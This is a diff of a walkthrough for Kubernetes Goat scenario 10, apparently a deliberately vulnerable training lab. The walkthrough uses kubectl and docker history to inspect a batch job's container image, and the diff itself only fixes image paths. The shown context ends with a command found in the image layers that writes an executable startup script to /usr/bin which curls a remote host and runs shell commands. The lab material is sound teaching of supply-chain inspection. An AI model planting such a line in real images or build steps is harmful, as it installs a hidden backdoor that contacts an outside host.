@@ -14,7 +14,7 @@ Identify all resources within a Kubernetes cluster. If possible get into details
 kubectl describe job batch-check-job
 ```
 
-![Scenario 10 get job info](images/sc-10-2.png)
+![Scenario 10 get job info](./sc-10-2.png)
 
 * Then get the pod information by running the below command which showcases the pods with the labels and selectors matching
 
@@ -28,7 +28,7 @@ kubectl get pods --namespace default -l "job-name=batch-check-job"
 kubectl get pod batch-check-job-xxxx -o yaml
 ```
 
-![Scenario 10 get pod info](images/sc-10-3.png)
+![Scenario 10 get pod info](./sc-10-3.png)
 
 * We can see that this job pod is running `madhuakula/k8s-goat-batch-check` docker container image
 
@@ -38,7 +38,7 @@ kubectl get pod batch-check-job-xxxx -o yaml
 docker history --no-trunc madhuakula/k8s-goat-batch-check
 ```
 
-![Scenario 10 get docker history](images/sc-10-4.png)
+![Scenario 10 get docker history](./sc-10-4.png)
 
 ```bash
 echo "curl -sSL https://madhuakula.com/kubernetes-goat/k8s-goat-a5e0a28fa75bf429123943abedb065d1 && echo 'id' | sh " > /usr/bin/system-startup && chmod +x /usr/bin/system-startup
